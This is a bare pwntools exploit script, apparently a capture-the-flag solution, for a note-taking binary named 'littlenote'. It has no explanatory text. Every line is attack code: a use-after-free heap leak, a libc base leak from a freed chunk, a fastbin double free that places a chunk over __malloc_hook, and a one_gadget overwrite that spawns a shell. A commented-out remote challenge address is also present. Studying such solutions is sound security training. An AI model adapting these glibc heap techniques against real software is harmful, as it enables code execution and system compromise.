from pwn import *
def cmd(c):
	p.sendlineafter("choice",str(c))
def add(c='\x00',mode='Y'):
	cmd(1)
	p.sendafter("note\n",c)
	p.sendlineafter("note?\n",mode)
def free(idx):
	cmd(3)
	p.sendlineafter("delete?\n",str(idx))
def show(idx):
	cmd(2)
	p.sendlineafter("show?\n",str(idx))
	
p=process("./littlenote")
#p=remote("202.0.1.70",40001)
context.log_level='debug'
binary=ELF('./littlenote')
add()#0
add()#1
free(1)
free(0)
show(0)
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x555555757070-0x0000555555757000)
log.warning(hex(heap))
free(1)
add('\x10')#2
add(p64(0)+p64(0x71))#3
add(p64(0x21)*12)
add()#5
free(3)
add(p64(0)+p64(0x91))#6
free(5)
show(5)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x00007ffff7a0d000)
log.warning(hex(base))
add()#7
add()#8
free(7)
free(8)
free(7)
libc=ELF("./libc.so.6")
libc.address=base
add(p64(libc.symbols['__malloc_hook']-35))
add()
add()
one=0xf02a4+base
add("\x00"*19+p64(one))
cmd(1)
p.interactive()
